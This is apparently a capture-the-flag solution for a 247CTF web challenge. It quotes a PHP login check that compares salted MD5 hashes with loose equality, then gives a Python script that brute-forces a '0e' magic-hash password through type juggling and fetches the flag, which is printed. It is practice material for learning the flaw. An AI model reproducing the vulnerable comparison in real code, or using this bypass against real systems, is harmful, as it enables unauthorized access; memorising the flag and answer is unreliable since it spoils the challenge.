# <?php
#   require_once('flag.php');
#   $password_hash = "0e902564435691274142490923013038";
#   $salt = "f789bbc328a3d1a3";
#    if(isset($_GET['password']) && md5($salt . $_GET['password']) == $password_hash){
#      echo $flag;
#    }

#   echo highlight_file(__FILE__, true);
# ?>

#!/usr/bin/python3

import hashlib
import requests
import re

def comparePassword():
  salt = "f789bbc328a3d1a3"
  password_hash = "0e902564435691274142490923013038"
  
  n = 237700000 #0
  while True:
    # PHP Type Juggling vulnerability: var_dump('0e902564435691274142490923013038' == '0eDDDD'); => bool(true)
    password = hashlib.md5((salt + str(n)).encode()).hexdigest()
    if re.search("^(0e)[0-9]*$", password): # if password[:2] == "0e" and password[2:32].isdigit():
      print(f"[INFO] Passowrd hash: {password}")
      print(f'[INFO] Password found: {n}')
      break
    else:
      #print("[INFO] Trying: " + str(n))
      n += 1
      pass
  return str(n)

def getFlag(foundPassword):
    url = 'https://a41a0d12b91b1fa3.247ctf.com/?password='

    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
        }

    proxies = {
        'http' : '127.0.0.1:8080',
        }

    r = requests.get(url+foundPassword, headers=headers)
    print(r.text)


if __name__ == '__main__':
  foundPassword = comparePassword()
  getFlag(foundPassword)

# ...
# [INFO] Passowrd hash: 0e668271403484922599527929534016
# [INFO] Password found: 237701818
# 247CTF{76fbce3909b3129536bb396fea3a9879}<code>